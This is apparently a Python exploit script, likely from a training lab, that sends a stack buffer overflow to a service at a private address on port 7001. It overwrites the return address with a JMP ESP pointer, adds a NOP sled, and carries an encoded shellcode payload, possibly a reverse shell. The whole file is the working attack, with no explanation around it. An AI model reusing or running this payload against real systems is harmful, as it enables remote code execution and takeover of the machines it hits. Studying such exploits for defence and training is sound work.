#!/usr/bin/python
import socket

try:
  print("\nSending evil buffer...")

  size = 2560
  filler = b"A" * 2288
  # eip = b"B" * 4
  eip = b"\xcf\x10\x80\x14" # 0x148010cf JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10  
  shellcode = (
        b"\xbe\x40\xe2\x9d\xba\xda\xd1\xd9\x74\x24\xf4\x58\x33\xc9"
        b"\xb1\x52\x31\x70\x12\x03\x70\x12\x83\xa8\x1e\x7f\x4f\xd4"
        b"\x37\x02\xb0\x24\xc8\x63\x38\xc1\xf9\xa3\x5e\x82\xaa\x13"
        b"\x14\xc6\x46\xdf\x78\xf2\xdd\xad\x54\xf5\x56\x1b\x83\x38"
        b"\x66\x30\xf7\x5b\xe4\x4b\x24\xbb\xd5\x83\x39\xba\x12\xf9"
        b"\xb0\xee\xcb\x75\x66\x1e\x7f\xc3\xbb\x95\x33\xc5\xbb\x4a"
        b"\x83\xe4\xea\xdd\x9f\xbe\x2c\xdc\x4c\xcb\x64\xc6\x91\xf6"
        b"\x3f\x7d\x61\x8c\xc1\x57\xbb\x6d\x6d\x96\x73\x9c\x6f\xdf"
        b"\xb4\x7f\x1a\x29\xc7\x02\x1d\xee\xb5\xd8\xa8\xf4\x1e\xaa"
        b"\x0b\xd0\x9f\x7f\xcd\x93\xac\x34\x99\xfb\xb0\xcb\x4e\x70"
        b"\xcc\x40\x71\x56\x44\x12\x56\x72\x0c\xc0\xf7\x23\xe8\xa7"
        b"\x08\x33\x53\x17\xad\x38\x7e\x4c\xdc\x63\x17\xa1\xed\x9b"
        b"\xe7\xad\x66\xe8\xd5\x72\xdd\x66\x56\xfa\xfb\x71\x99\xd1"
        b"\xbc\xed\x64\xda\xbc\x24\xa3\x8e\xec\x5e\x02\xaf\x66\x9e"
        b"\xab\x7a\x28\xce\x03\xd5\x89\xbe\xe3\x85\x61\xd4\xeb\xfa"
        b"\x92\xd7\x21\x93\x39\x22\xa2\x5c\x15\x01\x9b\x35\x64\x59"
        b"\xda\x7e\xe1\xbf\xb6\x90\xa4\x68\x2f\x08\xed\xe2\xce\xd5"
        b"\x3b\x8f\xd1\x5e\xc8\x70\x9f\x96\xa5\x62\x48\x57\xf0\xd8"
        b"\xdf\x68\x2e\x74\x83\xfb\xb5\x84\xca\xe7\x61\xd3\x9b\xd6"
        b"\x7b\xb1\x31\x40\xd2\xa7\xcb\x14\x1d\x63\x10\xe5\xa0\x6a"
        b"\xd5\x51\x87\x7c\x23\x59\x83\x28\xfb\x0c\x5d\x86\xbd\xe6"
        b"\x2f\x70\x14\x54\xe6\x14\xe1\x96\x39\x62\xee\xf2\xcf\x8a"
        b"\x5f\xab\x89\xb5\x50\x3b\x1e\xce\x8c\xdb\xe1\x05\x15\xeb"
        b"\xab\x07\x3c\x64\x72\xd2\x7c\xe9\x85\x09\x42\x14\x06\xbb"
        b"\x3b\xe3\x16\xce\x3e\xaf\x90\x23\x33\xa0\x74\x43\xe0\xc1"
        b"\x5c")

  
  shellcode += b"D" * (3000 - len(filler) - len(eip) - len(offset) - len(shellcode))
  buffer = filler + eip + offset + nops + shellcode
 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.232.10", 7001))
  s.send(buffer)
  s.close()
  
  print("\nDone!")
  
except:
  print("\nCould not connect!")
